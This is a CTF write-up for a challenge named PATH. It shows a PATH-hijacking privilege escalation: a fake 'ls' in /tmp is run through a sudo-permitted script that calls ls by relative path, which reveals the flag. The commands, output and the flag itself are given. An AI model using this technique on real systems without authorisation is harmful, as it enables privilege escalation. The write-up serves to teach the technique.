# PATH
## Intro
A challenge with 400pts the description was : `priv_esc` paths and paths and paths... 
So we can notice that the challenge has a relation with the path variable and the privilege escalation, the first thing that comes into my mind is a challenge named "Bash - System 1" in the App - Script Category in Rootme
here is [its link ](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)
## Now Let's Get Started
When entering the instance and executing `ls -lah` in `~` 
```
ctf@f9257cd1373a:~$ ls -lah
total 28K
drwxr-xr-x 1 root root        4.0K Jun 15 17:00 .
drwxr-xr-x 1 root root        4.0K Jun 15 17:00 ..
-rw-r--r-- 1 root root         220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 root root        3.7K Jan  6  2022 .bashrc
-rw-r--r-- 1 root root         807 Jan  6  2022 .profile
-r--r----- 1 root ctf-cracked   40 Jun 15 16:56 flag.txt
-r-xr-xr-x 1 root root          20 Jun 15 16:57 my_ls
```
we can see that there is a file named `flag.txt`, the special thing is that it is readable only by the owner (root) and the groupe (ctf-cracked)
let's try to read it 
```
ctf@f9257cd1373a:~$ cat flag.txt 
cat: flag.txt: Permission denied
```
as expected, let's try another thing 
```
tf@f9257cd1373a:~$ sudo -u ctf-cracked cat flag.txt 
[sudo] password for ctf: 
Sorry, user ctf is not allowed to execute '/usr/bin/cat flag.txt' as ctf-cracked on f9257cd1373a.
```
okay then...                                  
we notice also that there is a file named `my_ls` let's see what we can find inside
``` 
ctf@f9257cd1373a:~$ cat my_ls 
#!/bin/bash

ls -alh
```
hmmm it seems like a bash script that execute the command `ls -alh`, we go and run it 

```
ctf@f9257cd1373a:~$ ./my_ls 
total 28K
drwxr-xr-x 1 root root        4.0K Jun 15 17:00 .
drwxr-xr-x 1 root root        4.0K Jun 15 17:00 ..
-rw-r--r-- 1 root root         220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 root root        3.7K Jan  6  2022 .bashrc
-rw-r--r-- 1 root root         807 Jan  6  2022 .profile
-r--r----- 1 root ctf-cracked   40 Jun 15 16:56 flag.txt
-r-xr-xr-x 1 root root          20 Jun 15 16:57 my_ls
```
nothin special, but this brings me an idea let's play a trick
since the challenge is named PATH let's check if this variable is writeable
```
ctf@f9257cd1373a:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf@f9257cd1373a:~$ export PATH=.:$PATH
ctf@f9257cd1373a:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
yes it is
so after sawing the my_ls file and this PATH vulnerability let's try to create a new ls command that open a shell and execute `cat flag.txt` as ctf-cracked
```
ctf@f9257cd1373a:~$ mkdir /tmp/me
tf@f9257cd1373a:~$ cat > /tmp/me/ls
#!/bin/bash


cat flag.txt;
^C
ctf@f9257cd1373a:~$ chmod +x /tmp/me/ls
ctf@f9257cd1373a:~$ export PATH=/tmp/me:$PATH
ctf@f9257cd1373a:~$ sudo -u ctf-cracked ./my_ls
ISICTF{R3l47iV3_P4TH_4R3_Dan9eRou$_ouxs}
```
**The flag** : ISICTF{R3l47iV3_P4TH_4R3_Dan9eRou$_ouxs}

